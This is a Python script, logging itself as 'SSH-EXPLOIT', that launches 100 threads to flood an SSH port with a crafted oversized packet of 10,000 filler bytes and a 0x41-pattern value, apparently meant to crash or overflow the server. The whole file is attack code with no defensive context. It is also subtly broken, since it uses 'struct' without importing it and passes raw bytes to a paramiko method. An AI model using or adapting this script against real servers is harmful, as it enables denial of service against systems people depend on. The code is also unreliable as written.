import socket
import paramiko
import threading
import time
import logging
from concurrent.futures import ThreadPoolExecutor

TARGET_IP = "127.0.0.1"
TARGET_PORT = 22
THREADS = 100  # Tuned for stability
DELAY = 0.1

logging.basicConfig(level=logging.INFO, format='[SSH-EXPLOIT] %(message)s')
stop_event = threading.Event()

def craft_evil_packet():
    pkt = b'\x00\x00\x00\x0f' + b'\x14' + b'A' * 10000 + struct.pack("<Q", 0x4141414141414141)
    return pkt

def send_garbage():
    while not stop_event.is_set():
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(5)
            sock.connect((TARGET_IP, TARGET_PORT))
            transport = paramiko.Transport(sock)
            pkt = craft_evil_packet()
            transport._send_message(pkt)
            logging.info("Packet sent successfully")
            sock.close()
            time.sleep(DELAY)
        except Exception as e:
            logging.warning(f"Send error: {e}")
            time.sleep(DELAY * 2)

def main():
    logging.info(f"Starting attack on {TARGET_IP}:{TARGET_PORT} with {THREADS} threads")
    with ThreadPoolExecutor(max_workers=THREADS) as executor:
        futures = [executor.submit(send_garbage) for _ in range(THREADS)]
        try:
            while True:
                time.sleep(1)
        except KeyboardInterrupt:
            logging.info("Stopping attack...")
            stop_event.set()

if __name__ == "__main__":
    main()
